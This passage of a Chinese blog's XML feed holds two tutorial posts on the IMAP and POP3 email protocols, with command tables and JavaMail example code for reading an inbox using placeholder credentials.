结束</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> three </tag>
            
            <tag> 图形学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子邮件的实现之IMAP（Java版）</title>
      <link href="/2017/11/25/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8BIMAP%EF%BC%88Java%E7%89%88%EF%BC%89/"/>
      <url>/2017/11/25/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8BIMAP%EF%BC%88Java%E7%89%88%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>IMAP（Internet Mail Access Protocol，Internet邮件访问协议）以前称作交互邮件访问协议（Interactive Mail Access Protocol）。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端（例如MS Outlook Express)可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP&#x2F;IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。</p><span id="more"></span><p>与POP3协议类似，IMAP（Internet消息访问协议）也是提供面向用户的邮件收取服务。常用的版本是IMAP4。<br>IMAP4改进了POP3的不足，用户可以通过浏览信件头来决定是否收取、删除和检索邮件的特定部分，还可以在服务器上创建或更改文件夹或邮箱。它除了支持POP3协议的脱机操作模式外，还支持联机操作和断连接操作。它为用户提供了有选择的从邮件服务器接收邮件的功能、基于服务器的信息处理功能和共享信箱功能。IMAP4的脱机模式不同于POP3，它不会自动删除在邮件服务器上已取出的邮件，其联机模式和断连接模式也是将邮件服务器作为“远程文件服务器”进行访问，更加灵活方便。IMAP4支持多个邮箱。<br>IMAP4的这些特性非常适合在不同的计算机或终端之间操作邮件的用户（例如你可以在手机、PAD、PC上的邮件代理程序操作同一个邮箱），以及那些同时使用多个邮箱的用户。</p><p>各参数返回的邮件信息：</p><table><thead><tr><th>参数</th><th>代表信息</th></tr></thead><tbody><tr><td>ALL</td><td>只返回按照一定格式的邮件摘要，包括邮件标志、RFC822.SIZE、自身的时间和信封信息。IMAP客户机能够将标准邮件解析成这些信息并显示出来。</td></tr><tr><td>BODY</td><td>只返回邮件体文本格式和大小的摘要信息。IMAP客户机可以识别这些细腻，并向用户显示详细的关于邮件的信息。其实是一些非扩展的BODYSTRUCTURE的信息。</td></tr><tr><td>FAST</td><td>只返回邮件的一些摘要，包括邮件标志、RFC822.SIZE、和自身的时间。</td></tr><tr><td>FULL</td><td>同样的还是一些摘要信息，包括邮件标志、RFC822.SIZE、自身的时间和BODYSTRUCTURE的信息。</td></tr><tr><td>BODYSTRUCTUR</td><td>是邮件的[MIME-IMB]的体结构。这是服务器通过解析[RFC-2822]头中的[MIME-IMB]各字段和[MIME-IMB]头信息得出来 的。包括的内容有：邮件正文的类型、字符集、编码方式等和各附件的类型、字符集、编码方式、文件名称等等。</td></tr><tr><td>ENVELOPE</td><td>信息的信封结构。是服务器通过解析[RFC-2822]头中的[MIME-IMB]各字段得出来的，默认各字段都是需要的。主要包括：自身的时间、附件数、收件人、发件人等。</td></tr><tr><td>FLAGS</td><td>此邮件的标志。</td></tr><tr><td>INTERNALDATE</td><td>自身的时间。</td></tr><tr><td>RFC822.SIZE</td><td>邮件的[RFC-2822]大小</td></tr><tr><td>RFC822.HEADER</td><td>在功能上等同于BODY.PEEK[HEADER]，</td></tr><tr><td>RFC822</td><td>功能上等同于BODY[]。</td></tr><tr><td>RFC822.TEXT</td><td>功能上等同于BODY[TEXT]</td></tr><tr><td>UID</td><td>返回邮件的UID号，UID号是唯一标识邮件的一个号码。</td></tr><tr><td>BODY[section] <code>&lt;&lt;partial&gt;&gt;</code></td><td>返回邮件的中的某一指定部分，返回的部分用section来表示，section部分包含的信息通常是 代表某一部分的一个数字或者是下面的某一个部分：HEADER, HEADER.FIELDS, HEADER.FIELDS.NOT, MIME, and TEXT。如果section部分是空的话，那就代表返回全部的信息，包括头信息。</td></tr><tr><td>BODY[HEADER]</td><td>返回完整的文件头信息。</td></tr><tr><td>BODY[HEADER.FIELDS ()]</td><td>在小括号里面可以指定返回的特定字段。</td></tr><tr><td>BODY[HEADER.FIELDS.NOT ()]</td><td>在小括号里面可以指定不需要返回的特定字段。</td></tr><tr><td>BODY[MIME]</td><td>返回邮件的[MIME-IMB]的头信息，在正常情况下跟BODY[HEADER]没有区别。</td></tr><tr><td>BODY[TEXT]</td><td>返回整个邮件体，这里的邮件体并不包括邮件头。</td></tr></tbody></table><p>代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package <span class="variable constant_">IMAP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Properties</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Folder</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Message</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Session</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Store</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">internet</span>.<span class="property">MimeMessage</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">internet</span>.<span class="property">MimeUtility</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">POP3</span>.<span class="property">POP3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">mail</span>.<span class="property">imap</span>.<span class="property">IMAPMessage</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">IMAP</span> &#123;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line"><span class="comment">// 准备连接服务器的会话信息</span></span><br><span class="line"><span class="title class_">Properties</span> props = <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.store.protocol&quot;</span>, <span class="string">&quot;imap&quot;</span>);</span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.imap.host&quot;</span>, <span class="string">&quot;imap.sina.cn&quot;</span>);</span><br><span class="line">props.<span class="title function_">setProperty</span>(<span class="string">&quot;mail.imap.port&quot;</span>, <span class="string">&quot;143&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Session实例对象</span></span><br><span class="line"><span class="title class_">Session</span> session = <span class="title class_">Session</span>.<span class="title function_">getInstance</span>(props);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建IMAP协议的Store对象</span></span><br><span class="line"><span class="title class_">Store</span> store = session.<span class="title function_">getStore</span>(<span class="string">&quot;imap&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接邮件服务器</span></span><br><span class="line">store.<span class="title function_">connect</span>(<span class="string">&quot;your_name@sina.cn&quot;</span>, <span class="string">&quot;your_password&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得收件箱</span></span><br><span class="line"><span class="title class_">Folder</span> folder = store.<span class="title function_">getFolder</span>(<span class="string">&quot;INBOX&quot;</span>);</span><br><span class="line"><span class="comment">// 以读写模式打开收件箱</span></span><br><span class="line">folder.<span class="title function_">open</span>(<span class="title class_">Folder</span>.<span class="property">READ_WRITE</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得收件箱的邮件列表</span></span><br><span class="line"><span class="title class_">Message</span>[] messages = folder.<span class="title function_">getMessages</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印不同状态的邮件数量</span></span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;收件箱中共&quot;</span> + messages.<span class="property">length</span> + <span class="string">&quot;封邮件!&quot;</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;收件箱中共&quot;</span> + folder.<span class="title function_">getUnreadMessageCount</span>() + <span class="string">&quot;封未读邮件!&quot;</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;收件箱中共&quot;</span> + folder.<span class="title function_">getNewMessageCount</span>() + <span class="string">&quot;封新邮件!&quot;</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;收件箱中共&quot;</span> + folder.<span class="title function_">getDeletedMessageCount</span>()</span><br><span class="line">+ <span class="string">&quot;封已删除邮件!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span></span><br><span class="line">.<span class="title function_">println</span>(<span class="string">&quot;------------------------开始解析邮件----------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析邮件</span></span><br><span class="line"><span class="keyword">for</span> (int i = <span class="number">0</span>, count = <span class="number">2</span>; i &lt; count; i++) &#123;</span><br><span class="line"><span class="title class_">MimeMessage</span> msg = (<span class="title class_">MimeMessage</span>) messages[i];</span><br><span class="line"><span class="title class_">String</span> subject = <span class="title class_">MimeUtility</span>.<span class="title function_">decodeText</span>(msg.<span class="title function_">getSubject</span>());</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;[&quot;</span> + subject + <span class="string">&quot;]未读，是否需要阅读此邮件（yes/no）？&quot;</span>);</span><br><span class="line"><span class="title class_">POP3</span>.<span class="title function_">parseMessage</span>(msg); <span class="comment">// 解析邮件</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">folder.<span class="title function_">close</span>(<span class="literal">false</span>);</span><br><span class="line">store.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数分析</p><p>版本4rev1（IMAP4rev1）允许一个客户端访问和操作在一个服务器上的电子邮件。<br>SELECT INBOX： 选择收件箱<br>EXISTS： 3封存在<br>FETCH<code> &lt;mail id&gt;&lt;datanames&gt;</code><br>ENVELOPE：信息的信封结构。<br>INTERNALDATE：自身的时间。<br>RFC822.SIZE：邮件的[RFC-2822]大小。<br>BODYSTRUCTUR： 是邮件的[MIME-IMB]的体结构。这是服务器通过解析[RFC-2822]头中的[MIME-IMB]各字段和[MIME-IMB]头信息得出来 的。包括的内容有：邮件正文的类型、字符集、编码方式等。<br>BODY[TEXT]：返回整个邮件体，这里的邮件体并不包括邮件头。<br>FLAGS：此邮件的标志。<br>EXAMINE：以只读方式打开邮箱，参数是需要打开的邮箱的名字，使用EXAMINE命令打开的邮箱不允许对邮件进行改动，因此不能增加或删除邮件的标志。<br>CLOSE：表示Client结束对当前Folder（文件夹&#x2F;邮箱）的访问，关闭邮箱该邮箱中所有标志为、DELETED的邮件就被从物理上删除。CLOSE没有命令参数。随后可以SELECT另一Folder。<br>LOGOUT：结束本次IMAP会话。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 电子邮件 </tag>
            
            <tag> Java </tag>
            
            <tag> IMAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子邮件的实现之 POP3（Java版）</title>
      <link href="/2017/11/25/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8B-POP3%EF%BC%88Java%E7%89%88%EF%BC%89/"/>
      <url>/2017/11/25/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8B-POP3%EF%BC%88Java%E7%89%88%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>POP3，全名为“Post Office Protocol - Version 3”，即“邮局协议版本3”。是TCP&#x2F;IP协议族中的一员，由RFC1939 定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供了SSL加密的POP3协议被称为POP3S。<br>POP 协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件。这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端送到个人终端机器上，一般是PC机或 MAC。一旦邮件发送到 PC 机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”，也就是改进的POP3协议。</p><span id="more"></span><p>POP3协议默认端口：110<br>POP3协议默认传输协议：TCP<br>POP3协议适用的构架结构：C&#x2F;S<br>POP3协议的访问模式：离线访问</p><p>POP3命令码</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>USER [username]</td><td>处理用户名</td></tr><tr><td>PASS [password]</td><td>处理用户密码</td></tr><tr><td>APOP [Name,Digest]</td><td>认可Digest是MD5消息摘要</td></tr><tr><td>STAT</td><td>处理请求服务器发回关于邮箱的统计资料，如邮件总数和总字节数</td></tr><tr><td>UIDL [Msg#]</td><td>处理返回邮件的唯一标识符，POP3会话的每个标识符都将是唯一的</td></tr><tr><td>LIST [Msg#]</td><td>处理返回邮件数量和每个邮件的大小</td></tr><tr><td>RETR [Msg#]</td><td>处理返回由参数标识的邮件的全部文本</td></tr><tr><td>DELE [Msg#]</td><td>处理服务器将由参数标识的邮件标记为删除，由quit命令执行</td></tr><tr><td>RSET</td><td>处理服务器将重置所有标记为删除的邮件，用于撤消DELE命令</td></tr><tr><td>TOP [Msg# n]</td><td>处理服务器将返回由参数标识的邮件前n行内容，n必须是正整数</td></tr><tr><td>NOOP</td><td>处理服务器返回一个肯定的响应</td></tr><tr><td>QUIT</td><td>终止会话</td></tr></tbody></table><p>代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">package <span class="title class_">POP3</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Properties</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">BodyPart</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Folder</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Message</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">MessagingException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Multipart</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Part</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Session</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">Store</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">mail</span>.<span class="property">internet</span>.<span class="property">MimeMessage</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">POP3</span> &#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">String</span>[] args</span>) &#123;</span><br><span class="line"><span class="title class_">String</span> protocol = <span class="string">&quot;pop3&quot;</span>;<span class="comment">// 使用pop3协议</span></span><br><span class="line"><span class="title class_">String</span> host = <span class="string">&quot;pop.sina.cn&quot;</span>;<span class="comment">// 163邮箱的pop3服务器</span></span><br><span class="line">int port = <span class="number">110</span>;<span class="comment">// 端口</span></span><br><span class="line"><span class="title class_">String</span> username = <span class="string">&quot;your_name@sina.cn&quot;</span>;<span class="comment">// 用户名</span></span><br><span class="line"><span class="title class_">String</span> password = <span class="string">&quot;your_password&quot;</span>;<span class="comment">// 密码</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Properties是一个属性对象，用来创建Session对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title class_">Properties</span> props = <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">props.<span class="title function_">put</span>(<span class="string">&quot;mail.pop3.host&quot;</span>, host);</span><br><span class="line">props.<span class="title function_">put</span>(<span class="string">&quot;mail.pop3.port&quot;</span>, port);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Session类定义了一个基本的邮件对话。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title class_">Session</span> session = <span class="title class_">Session</span>.<span class="title function_">getDefaultInstance</span>(props);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Store类实现特定邮件协议上的读、写、监视、查找等操作。 通过Store类可以访问Folder类。</span></span><br><span class="line"><span class="comment"> * Folder类用于分级组织邮件，并提供照Message格式访问email的能力。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title class_">Store</span> store = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">Folder</span> folder = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">store = session.<span class="title function_">getStore</span>(protocol);</span><br><span class="line">store.<span class="title function_">connect</span>(username, password);</span><br><span class="line"></span><br><span class="line">folder = store.<span class="title function_">getFolder</span>(<span class="string">&quot;INBOX&quot;</span>);</span><br><span class="line">folder.<span class="title function_">open</span>(<span class="title class_">Folder</span>.<span class="property">READ_ONLY</span>);<span class="comment">// 在这一步，收件箱所有邮件将被下载到本地</span></span><br><span class="line"><span class="comment">// int size = folder.getMessageCount();// 获取邮件数目</span></span><br><span class="line"><span class="title class_">Message</span>[] messages = folder.<span class="title function_">getMessages</span>();</span><br><span class="line"><span class="comment">// Message message = folder.getMessage(size);// 取得最新的那个邮件</span></span><br><span class="line"><span class="comment">// 解析邮件内容</span></span><br><span class="line"><span class="keyword">for</span> (int i = <span class="number">0</span>, count = <span class="number">2</span>; i &lt; count; i++) &#123;</span><br><span class="line"><span class="title class_">MimeMessage</span> msg = (<span class="title class_">MimeMessage</span>) messages[i];</span><br><span class="line"><span class="title function_">parseMessage</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (folder != <span class="literal">null</span>) &#123;</span><br><span class="line">folder.<span class="title function_">close</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (store != <span class="literal">null</span>) &#123;</span><br><span class="line">store.<span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;接收完毕！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMailTextContent</span>(<span class="title class_">Part</span> part, <span class="title class_">StringBuffer</span> content)</span><br><span class="line">throws <span class="title class_">MessagingException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="comment">// 如果是文本类型的附件，通过getContent方法可以取到文本内容，但这不是我们需要的结果，所以在这里要做判断</span></span><br><span class="line">boolean isContainTextAttach = part.<span class="title function_">getContentType</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;name&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (part.<span class="title function_">isMimeType</span>(<span class="string">&quot;text/*&quot;</span>) &amp;&amp; !isContainTextAttach) &#123;</span><br><span class="line">content.<span class="title function_">append</span>(part.<span class="title function_">getContent</span>().<span class="title function_">toString</span>());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (part.<span class="title function_">isMimeType</span>(<span class="string">&quot;message/rfc822&quot;</span>)) &#123;</span><br><span class="line"><span class="title function_">getMailTextContent</span>((<span class="title class_">Part</span>) part.<span class="title function_">getContent</span>(), content);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (part.<span class="title function_">isMimeType</span>(<span class="string">&quot;multipart/*&quot;</span>)) &#123;</span><br><span class="line"><span class="title class_">Multipart</span> multipart = (<span class="title class_">Multipart</span>) part.<span class="title function_">getContent</span>();</span><br><span class="line">int partCount = multipart.<span class="title function_">getCount</span>();</span><br><span class="line"><span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; partCount; i++) &#123;</span><br><span class="line"><span class="title class_">BodyPart</span> bodyPart = multipart.<span class="title function_">getBodyPart</span>(i);</span><br><span class="line"><span class="title function_">getMailTextContent</span>(bodyPart, content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">parseMessage</span>(<span class="title class_">MimeMessage</span> msg) throws <span class="title class_">MessagingException</span>,</span><br><span class="line"><span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;------------------解析第&quot;</span> + msg.<span class="title function_">getMessageNumber</span>()</span><br><span class="line">+ <span class="string">&quot;封邮件-------------------- &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">String</span> <span class="keyword">from</span> = msg.<span class="title function_">getFrom</span>()[<span class="number">0</span>].<span class="title function_">toString</span>();</span><br><span class="line"><span class="title class_">String</span> subject = msg.<span class="title function_">getSubject</span>();</span><br><span class="line">java.<span class="property">util</span>.<span class="property">Date</span> date = msg.<span class="title function_">getSentDate</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;From: &quot;</span> + <span class="keyword">from</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;Subject: &quot;</span> + subject);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;Date: &quot;</span> + date);</span><br><span class="line"><span class="title class_">StringBuffer</span> content = <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">30</span>);</span><br><span class="line"><span class="title function_">getMailTextContent</span>(msg, content);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;邮件正文：&quot;</span></span><br><span class="line">+ (content.<span class="title function_">length</span>() &gt; <span class="number">100</span> ? content.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">100</span>) + <span class="string">&quot;...&quot;</span></span><br><span class="line">: content));</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;------------------第&quot;</span> + msg.<span class="title function_">getMessageNumber</span>()</span><br><span class="line">+ <span class="string">&quot;封邮件解析结束-------------------- &quot;</span>);</span><br><span class="line"><span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数分析</p><p>CAPA：开始与 POP3 Server 送出的第一个指令，用于取得此服务器的功能选项清单<br>Capability list follows 返回指令<br>USER：与 POP3 Server 送出帐户名<br>PASS：与 POP3 Server 送出密码<br>STAT：取得服务器上本帐户存在的信件数量<br>NOOP：服务器返回一个肯定的响应，用于测试连接是否成功<br>TOP n m：取得第n封信件前m行的内容<br>TCP Spurious Retransmission：TCP虚假重传。 <br>当抓到2次同一包数据时，wireshark判断网络发生了重传，同时，wireshark抓到初传包的反馈ack，因此wireshark判断初传包实际并没有丢失，因此称为虚假重传。<br>IMF： Internet Message Format<br>RETR n：取得第n封信件完整内容<br>octet &#x3D; 1 Byte &#x3D;  8 bits<br>QUIT 告知 POP3 服务器即将说再见．</p>]]></content>
      
      
      
        <tags>
            
            <tag> 电子邮件 </tag>
            
            <tag> Java </tag>
            
            <tag> POP3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电子邮件的实现之 SMTP（Java版）</title>
      <link href="/2017/11/22/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8B-SMTP/"/>
      <url>/2017/11/22/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8B-SMTP/</url>
      
